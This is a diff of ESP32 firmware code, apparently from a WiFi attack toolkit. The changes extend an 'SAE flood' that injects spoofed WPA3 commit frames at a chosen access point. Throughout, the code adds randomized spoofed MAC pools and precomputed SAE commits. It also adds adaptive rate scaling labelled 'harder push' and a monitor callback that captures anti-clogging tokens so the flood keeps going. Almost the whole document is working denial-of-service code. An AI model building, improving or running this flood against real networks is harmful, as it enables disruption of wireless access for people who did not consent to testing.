-        spoofed_mac[4] = (frame_counter >> 8) & 0xFF;
-        spoofed_mac[5] = frame_counter & 0xFF;
+        if ((frame_counter % 100) == 0) {
+            ESP_LOGI("SAE_LOOP", "alive fc=%d sent=%d", frame_counter, sae_flood_packets_sent);
+        }
+        // Select spoofed MAC, pin to token MAC if anti-clogging token is active
+        if (sae_token_mac_valid) {
+            memcpy(spoofed_mac, sae_token_mac, 6);
+        } else if (sae_mac_pool_ready) {
+            int pool_idx = (frame_counter / (sae_frames_per_mac > 0 ? sae_frames_per_mac : 1)) % SAE_MAC_POOL_SIZE;
+            memcpy(spoofed_mac, sae_mac_pool[pool_idx], 6);
+        } else {
+            // Fallback to legacy derivation if pool not ready
+            memcpy(spoofed_mac, base_mac, 6);
+            spoofed_mac[4] = (frame_counter >> 8) & 0xFF;
+            spoofed_mac[5] = frame_counter & 0xFF;
+            // Ensure locally administered, unicast
+            spoofed_mac[0] |= 0x02;
+            spoofed_mac[0] &= 0xFE;
+        }
         
         // Inject SAE commit frame
-        inject_sae_commit_frame(spoofed_mac, frame_counter);
+        esp_err_t tx_res = inject_sae_commit_frame(spoofed_mac, frame_counter);
+        if (tx_res == ESP_ERR_NO_MEM) {
+            consecutive_no_mem++;
+            success_streak = 0;
+            backoff_ms = (backoff_ms == 0) ? 50 : (backoff_ms * 2);
+            if (backoff_ms > 1000) backoff_ms = 1000;
+            if (rate_scale_pct > 10) {
+                rate_scale_pct -= 20;
+                if (rate_scale_pct < 10) rate_scale_pct = 10;
+            }
+            ESP_LOGW("SAE_FLOOD", "ESP_ERR_NO_MEM, backing off %d ms (streak=%d)", backoff_ms, consecutive_no_mem);
+            vTaskDelay(pdMS_TO_TICKS(backoff_ms));
+        } else if (tx_res != ESP_OK) {
+            // brief pause on other errors to avoid tight loop
+            vTaskDelay(pdMS_TO_TICKS(20));
+        } else {
+            if (backoff_ms > 0) backoff_ms /= 2;
+            if (consecutive_no_mem) consecutive_no_mem = 0;
+            if (++success_streak >= 10) {
+                success_streak = 0;
+                if (rate_scale_pct < 100) {
+                    rate_scale_pct += 10;
+                    if (rate_scale_pct > 100) rate_scale_pct = 100;
+                }
+            }
+        }
         
         frame_counter = (frame_counter + 1) % 65536;
         
-        // Rate limiting with variation to avoid detection
-        int variation = (esp_random() % 20) - 10; // +/- 10% variation
-        int actual_rate = sae_injection_rate + (sae_injection_rate * variation / 100);
-        if (actual_rate < 50) actual_rate = 50; // minimum rate
-        if (actual_rate > 200) actual_rate = 200; // reduced maximum rate
+        // Rate limiting with variation and adaptive scaling
+        int base_rate = (sae_injection_rate * rate_scale_pct) / 100;
+        int variation = (esp_random() % 20) - 10; // +/- 10%
+        int actual_rate = base_rate + (base_rate * variation / 100);
+        if (actual_rate < 1) actual_rate = 1;
+        if (actual_rate > 200) actual_rate = 200;
         
         // Ensure minimum delay to prevent watchdog timeout
         int delay_ms = 1000 / actual_rate;
-        if (delay_ms < 5) delay_ms = 5; // minimum 5ms delay
+    if (delay_ms < 2) delay_ms = 2; // harder push
+        if (backoff_ms > delay_ms) delay_ms = backoff_ms;
         vTaskDelay(pdMS_TO_TICKS(delay_ms));
         
         // Yield to other tasks every 10 frames
@@ -4024,8 +5582,7 @@ static void sae_flood_task(void *param) {
         }
     }
     
-    printf("SAE flood task stopped. Total frames sent: %d\n", sae_flood_packets_sent);
-    TERMINAL_VIEW_ADD_TEXT("SAE flood task stopped. Total frames sent: %d\n", sae_flood_packets_sent);
+    printf("SAE flood stopped. Sent: %d\n", sae_flood_packets_sent);
     sae_flood_task_handle = NULL;
     vTaskDelete(NULL);
 }
@@ -4038,10 +5595,13 @@ static void sae_flood_display_task(void *param) {
         int current_rate = frames_in_period / 5;
         last_count = sae_flood_packets_sent;
         
-        printf("SAE Flood: %d frames/sec | Total: %d frames\n", 
-               current_rate, sae_flood_packets_sent);
-        TERMINAL_VIEW_ADD_TEXT("SAE Flood: %d frames/sec | Total: %d frames\n", 
-                              current_rate, sae_flood_packets_sent);
+        // Use simpler output to reduce stack usage
+        printf("SAE: %d/sec | %d total | hits:%u miss:%u pwefail:%u tok:%u txok:%u txerr:%u s76:%u s0:%u\n",
+               current_rate, sae_flood_packets_sent,
+               (unsigned)sae_cache_hits, (unsigned)sae_cache_misses,
+               (unsigned)sae_pwe_failures, (unsigned)sae_token_rx,
+               (unsigned)sae_commit_tx_ok, (unsigned)sae_commit_tx_err,
+               (unsigned)sae_status76_rx, (unsigned)sae_status0_rx);
         
         vTaskDelay(pdMS_TO_TICKS(5000));
     }
@@ -4050,7 +5610,23 @@ static void sae_flood_display_task(void *param) {
     vTaskDelete(NULL);
 }
 
-void wifi_manager_start_sae_flood(void) {
+static void sanitize_password_input(const char *in, char *out, size_t out_size) {
+    if (!out || out_size == 0) return;
+    if (!in) { out[0] = '\0'; return; }
+    while (*in && isspace((unsigned char)*in)) in++;
+    const char *end = in + strlen(in);
+    while (end > in && isspace((unsigned char)end[-1])) end--;
+    if (end > in + 1 && (in[0] == '"' || in[0] == '\'')) {
+        char q = in[0];
+        if (end[-1] == q) { in++; end--; }
+    }
+    size_t n = (size_t)(end - in);
+    if (n >= out_size) n = out_size - 1;
+    if (n > 0) memcpy(out, in, n);
+    out[n] = '\0';
+}
+
+void wifi_manager_start_sae_flood(const char *password) {
 #if !defined(CONFIG_IDF_TARGET_ESP32C5) && !defined(CONFIG_IDF_TARGET_ESP32C6)
     printf("SAE flood attack only supported on ESP32-C5 and ESP32-C6\n");
     TERMINAL_VIEW_ADD_TEXT("SAE flood attack only supported on ESP32-C5 and ESP32-C6\n");
@@ -4089,15 +5665,90 @@ void wifi_manager_start_sae_flood(void) {
 
     memcpy(sae_target_bssid, selected_ap.bssid, 6);
     sae_target_channel = selected_ap.primary;
-    sae_injection_rate = 100;
+    sae_injection_rate = 60;
     sae_flood_packets_sent = 0;
     sae_flood_running = true;
+    sae_initialized = false;
+    sanitize_password_input(password, sae_flood_password_buf, sizeof(sae_flood_password_buf));
+    portENTER_CRITICAL(&sae_lock);
+    sae_ctx.token_required = false;
+    sae_ctx.token_len = 0;
+    portEXIT_CRITICAL(&sae_lock);
 
-    wifi_manager_start_monitor_mode(NULL);
+    // Build a small pool of spoofed MACs to preserve randomness without exhausting heap
+    {
+        uint8_t base_mac_build[6];
+        esp_wifi_get_mac(WIFI_IF_STA, base_mac_build);
+        for (int i = 0; i < SAE_MAC_POOL_SIZE; ++i) {
+            uint32_t r = esp_random();
+            memcpy(sae_mac_pool[i], base_mac_build, 6);
+            // locally administered, unicast
+            sae_mac_pool[i][0] |= 0x02;
+            sae_mac_pool[i][0] &= 0xFE;
+            sae_mac_pool[i][4] = (r >> 8) & 0xFF;
+            sae_mac_pool[i][5] = r & 0xFF;
+            sae_seq_counters[i] = (uint16_t)(esp_random() & 0x0FFF);
+            sae_precompute_attempted[i] = false;
+            sae_commit_cache_ready[i] = false;
+        }
+        sae_mac_pool_ready = true;
+    }
+
+    // Precompute commit (element + scalar) per MAC to avoid per-frame allocations
+    memset(sae_commit_cache_ready, 0, sizeof(sae_commit_cache_ready));
+    const char *pwd = sae_flood_password_buf[0] ? sae_flood_password_buf : NULL;
+    const char *ssid = (selected_ap.ssid[0] != '\0') ? (char*)selected_ap.ssid : NULL;
+    if (pwd && strlen(pwd) > 0) {
+        if (!sae_crypto_initialized) {
+            mbedtls_entropy_init(&sae_entropy);
+            mbedtls_ctr_drbg_init(&sae_ctr_drbg);
+            mbedtls_ecp_point_init(&sae_tmp_point);
+            mbedtls_ctr_drbg_seed(&sae_ctr_drbg, mbedtls_entropy_func, &sae_entropy, NULL, 0);
+            sae_crypto_initialized = true;
+        }
+        if (!sae_initialized) {
+            mbedtls_ecp_group_init(&sae_ctx.group);
+            mbedtls_ecp_point_init(&sae_ctx.pwe);
+            mbedtls_ecp_point_init(&sae_ctx.own_element);
+            mbedtls_ecp_point_init(&sae_ctx.peer_element);
+            mbedtls_mpi_init(&sae_ctx.own_scalar);
+            mbedtls_mpi_init(&sae_ctx.peer_scalar);
+            mbedtls_mpi_init(&sae_ctx.rand);
+            mbedtls_mpi_init(&sae_ctx.mask);
+            if (mbedtls_ecp_group_load(&sae_ctx.group, MBEDTLS_ECP_DP_SECP256R1) != 0) {
+                // Skip precompute on error
+            } else {
+                int precomputed = 0;
+                for (int i = 0; i < SAE_MAC_POOL_SIZE && precomputed < SAE_PRECOMPUTE_LIMIT; ++i) {
+                    if (sae_precompute_attempted[i]) continue;
+                    sae_precompute_attempted[i] = true;
+                if (sae_derive_pwe(pwd, sae_mac_pool[i], sae_target_bssid, ssid, &sae_ctx.pwe, &sae_ctx.group) == ESP_OK) {
+                        if (sae_generate_commit(&sae_ctx) == ESP_OK) {
+                            uint8_t element_buf[33];
+                            size_t elen = 0;
+                            if (mbedtls_ecp_point_write_binary(&sae_ctx.group, &sae_ctx.own_element,
+                                                               MBEDTLS_ECP_PF_COMPRESSED, &elen,
+                                                               element_buf, sizeof(element_buf)) == 0 && elen == 33) {
+                                memcpy(sae_commit_element_cache[i], element_buf, 33);
+                                mbedtls_mpi_write_binary(&sae_ctx.own_scalar, sae_commit_scalar_cache[i], 32);
+                                sae_commit_cache_ready[i] = true;
+                                precomputed++;
+                            }
+                        }
+                    } else {
+                        sae_pwe_failures++;
+                    }
+                }
+            }
+            sae_initialized = true;
+        }
+    }
+
+    wifi_manager_start_monitor_mode(sae_monitor_callback);
     esp_wifi_set_channel(sae_target_channel, WIFI_SECOND_CHAN_NONE);
 
-    xTaskCreate(sae_flood_task, "sae_flood_task", 4096, NULL, 5, &sae_flood_task_handle);
-    xTaskCreate(sae_flood_display_task, "sae_flood_display", 2048, NULL, 3, &sae_flood_display_task_handle);
+    xTaskCreate(sae_flood_task, "sae_flood_task", 3072, NULL, 5, &sae_flood_task_handle);
+    xTaskCreate(sae_flood_display_task, "sae_displ", 2048, NULL, 3, &sae_flood_display_task_handle);
 
     char bssid_str[18];
     snprintf(bssid_str, sizeof(bssid_str), "%02x:%02x:%02x:%02x:%02x:%02x",
@@ -4128,6 +5779,26 @@ void wifi_manager_stop_sae_flood(void) {
     }
     
     wifi_manager_stop_monitor_mode();
+    if (sae_initialized) {
+        mbedtls_ecp_group_free(&sae_ctx.group);
+        mbedtls_ecp_point_free(&sae_ctx.pwe);
+        mbedtls_ecp_point_free(&sae_ctx.peer_element);
+        mbedtls_ecp_point_free(&sae_ctx.own_element);
+        mbedtls_mpi_free(&sae_ctx.peer_scalar);
+        mbedtls_mpi_free(&sae_ctx.own_scalar);
+        mbedtls_mpi_free(&sae_ctx.rand);
+        mbedtls_mpi_free(&sae_ctx.mask);
+        memset(&sae_ctx, 0, sizeof(sae_ctx));
+        sae_initialized = false;
+    }
+    if (sae_crypto_initialized) {
+        mbedtls_ecp_point_free(&sae_tmp_point);
+        mbedtls_ctr_drbg_free(&sae_ctr_drbg);
+        mbedtls_entropy_free(&sae_entropy);
+        sae_crypto_initialized = false;
+    }
+    memset(sae_commit_cache_ready, 0, sizeof(sae_commit_cache_ready));
+    sae_mac_pool_ready = false;
     printf("SAE flood attack stopped. Total frames sent: %d\n", sae_flood_packets_sent);
     TERMINAL_VIEW_ADD_TEXT("SAE flood attack stopped. Total frames sent: %d\n", sae_flood_packets_sent);
 }
@@ -4164,7 +5835,23 @@ void wifi_manager_store_html_chunk(const char* data, size_t len, bool is_final) 
     if (is_final) {
         html_buffer[html_buffer_size] = '\0';
         printf("HTML content stored in buffer (%zu bytes)\n", html_buffer_size);
+        ESP_LOGI(TAG, "HTML capture completed: buffer=%p, size=%zu, use_html_buffer=%s", 
+                 html_buffer, html_buffer_size, use_html_buffer ? "true" : "false");
     }
+}
+
+void wifi_manager_clear_html_buffer(void) {
+    ESP_LOGI(TAG, "Clearing HTML buffer - current state: buffer=%p, size=%zu, use_html_buffer=%s", 
+             html_buffer, html_buffer_size, use_html_buffer ? "true" : "false");
+    
+    use_html_buffer = false;
+    if (html_buffer != NULL) {
+        free(html_buffer);
+        html_buffer = NULL;
+    }
+    html_buffer_size = 0;
+    printf("HTML buffer cleared and disabled\n");
+    ESP_LOGI(TAG, "HTML buffer cleared successfully");
 }
 
 void wifi_manager_sae_flood_help(void) {
@@ -4179,3 +5866,106 @@ void wifi_manager_sae_flood_help(void) {
     printf("Commands: saeflood, stopsaeflood, saefloodhelp\n");
     TERMINAL_VIEW_ADD_TEXT("Commands: saeflood, stopsaeflood, saefloodhelp\n");
 }
+
+
+
+/**
+ * SAE monitoring callback to handle commit/confirm responses and anti-clogging tokens
+ */
+static void sae_monitor_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
+    if (type != WIFI_PKT_MGMT) return;
+    
+    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
+    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)pkt->payload;
+    wifi_ieee80211_mac_hdr_t hdr_copy;
+    memcpy(&hdr_copy, &ipkt->hdr, sizeof(wifi_ieee80211_mac_hdr_t));  // Copy to avoid unaligned pointer
+    const wifi_ieee80211_mac_hdr_t *hdr = &hdr_copy;
+    
+    // Check if it's an authentication frame from our target AP
+    if ((hdr->frame_ctrl & 0xFC) != 0xB0) return;  // Not auth frame
+    if (memcmp(hdr->addr2, sae_target_bssid, 6) != 0) return;  // Not from target AP
+    
+    const uint8_t *auth_body = ipkt->payload;
+    uint16_t auth_alg = auth_body[0] | (auth_body[1] << 8);
+    uint16_t auth_seq = auth_body[2] | (auth_body[3] << 8);
+    uint16_t status_code = auth_body[4] | (auth_body[5] << 8);
+    
+    if (auth_alg != 3) return;  // Not SAE
+    
+    if (auth_seq == 1) {  // SAE Commit response
+        if (status_code == 76) {  // Anti-clogging token required
+            ESP_LOGI("SAE_RX", "status 76 token required");
+            uint16_t group_id = auth_body[6] | (auth_body[7] << 8);
+            // payload length is total mgmt payload minus 24 byte MAC header
+            size_t payload_len = (pkt->rx_ctrl.sig_len > 24) ? (size_t)pkt->rx_ctrl.sig_len - 24 : 0;
+            // Authentication body starts at payload+24
+            const uint8_t *auth_payload = (const uint8_t*)ipkt; // ipkt->payload already points past header in struct
+            const uint8_t *ptr = auth_body + 8;
+            size_t remaining = (payload_len > 8) ? (payload_len - 8) : 0;
+            uint16_t tlen = 0;
+            if (group_id == 19 && remaining >= 2) {
+                // For our simplified format, treat everything after group as token up to our cap
+                tlen = (remaining > sizeof(sae_ctx.token)) ? sizeof(sae_ctx.token) : (uint16_t)remaining;
+            }
+            portENTER_CRITICAL(&sae_lock);
+            sae_ctx.token_required = (tlen > 0);
+            sae_ctx.token_len = tlen;
+            if (tlen) memcpy(sae_ctx.token, ptr, tlen);
+            portEXIT_CRITICAL(&sae_lock);
+            memcpy(sae_token_mac, hdr->addr1, 6);
+            sae_token_mac_valid = true;
+            sae_token_rx++;
+            sae_status76_rx++;
+        } else if (status_code == 0) {  // Success - extract peer commit
+            ESP_LOGI("SAE_RX", "status 0 commit accepted");
+            // Extract peer scalar and element from response
+            uint16_t group_id = auth_body[6] | (auth_body[7] << 8);
+            if (group_id == 19) {  // P-256
+                // Peer scalar (32 bytes) + element (32 bytes)
+                mbedtls_mpi_read_binary(&sae_ctx.peer_scalar, auth_body + 8, 32);
+                uint8_t peer_element_buf[33] = {0x02};  // Compressed format
+                memcpy(peer_element_buf + 1, auth_body + 40, 32);
+                mbedtls_ecp_point_read_binary(&sae_ctx.group, &sae_ctx.peer_element, 
+                                              peer_element_buf, 33);
+                // Match scalar and element to the MAC AP responded to; set full tuple
+                if (sae_mac_pool_ready) {
+                    for (int i = 0; i < SAE_MAC_POOL_SIZE; ++i) {
+                        if (sae_commit_cache_ready[i] && memcmp(hdr->addr1, sae_mac_pool[i], 6) == 0) {
+                            portENTER_CRITICAL(&sae_lock);
+                            memcpy(sae_ctx.own_mac, sae_mac_pool[i], 6);
+                            memcpy(sae_ctx.peer_mac, sae_target_bssid, 6);
+                            memcpy(sae_ctx.bssid, sae_target_bssid, 6);
+                            mbedtls_mpi_read_binary(&sae_ctx.own_scalar, sae_commit_scalar_cache[i], 32);
+                            portEXIT_CRITICAL(&sae_lock);
+                            ESP_LOGI("SAE_RX", "matched pool idx=%d", i);
+                            break;
+                        }
+                    }
+                }
+
+                // Ensure PWE is derived for this MAC tuple for confirm/KCK
+                const char *pwd = settings_get_sta_password(&G_Settings);
+                const char *ssid = (selected_ap.ssid[0] != '\0') ? (char*)selected_ap.ssid : NULL;
+                if (pwd && strlen(pwd) > 0) {
+                    ESP_LOGI("SAE_RX", "derive pwe for confirm path");
+                    sae_derive_pwe(pwd, sae_ctx.own_mac, sae_target_bssid, ssid, &sae_ctx.pwe, &sae_ctx.group);
+                }
+                
+                // do not send confirm; continue flooding commits only
+                sae_status0_rx++;
+                // Clear token state after a successful exchange
+                portENTER_CRITICAL(&sae_lock);
+                sae_ctx.token_required = false;
+                sae_ctx.token_len = 0;
+                portEXIT_CRITICAL(&sae_lock);
+                sae_token_mac_valid = false;
+            }
+        }
+    } else if (auth_seq == 2) {  // SAE Confirm response
+        ESP_LOGI("SAE_RX", "confirm status=%u", (unsigned)status_code);
+    }
+}
+/**
+ * Inject SAE confirm frame after successful commit exchange
+ */
+// confirm injection removed – flood commits only
